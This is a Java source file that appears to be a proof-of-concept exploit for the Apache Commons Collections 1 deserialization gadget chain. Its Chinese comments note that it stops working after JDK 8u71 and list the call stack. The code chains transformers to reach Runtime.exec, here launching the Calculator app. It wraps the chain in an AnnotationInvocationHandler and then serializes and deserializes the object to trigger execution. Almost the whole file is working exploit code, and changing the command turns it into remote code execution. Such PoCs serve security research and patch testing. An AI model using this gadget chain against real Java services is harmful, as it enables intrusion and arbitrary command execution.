package com.SugarP1g.deserialization.CommonsCollections.CommonCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * 在Java 8u71以后的版本中该POC无法使用。因为在8u71版本以后，官方修改了AnnotationInvocationHandler类readobject函数实现。
 * 不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。
 *
 * 本地测试JDK版本: 8u66
 * 反序列化触发点: sun.reflect.annotation.AnnotationInvocationHandler: readObject
 * 利用调用栈:
 *  readObject:432, AnnotationInvocationHandler (sun.reflect.annotation)
 *  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 *  invoke:62, NativeMethodAccessorImpl (sun.reflect)
 *  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 *  invoke:497, Method (java.lang.reflect)
 *  invokeReadObject:1058, ObjectStreamClass (java.io)
 *  readSerialData:1900, ObjectInputStream (java.io)
 *  readOrdinaryObject:1801, ObjectInputStream (java.io)
 *  readObject0:1351, ObjectInputStream (java.io)
 *  readObject:371, ObjectInputStream (java.io)
 *  main:58, PocWithTransformedMap (com.SugarP1g.deserialization.CommonsCollections.CommonCollections1)
 */
public class PocWithTransformedMap {
    public static void main(String[] args) throws Exception {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,
                        Class[].class}, new Object[]{"getRuntime",
                        new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,
                        Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
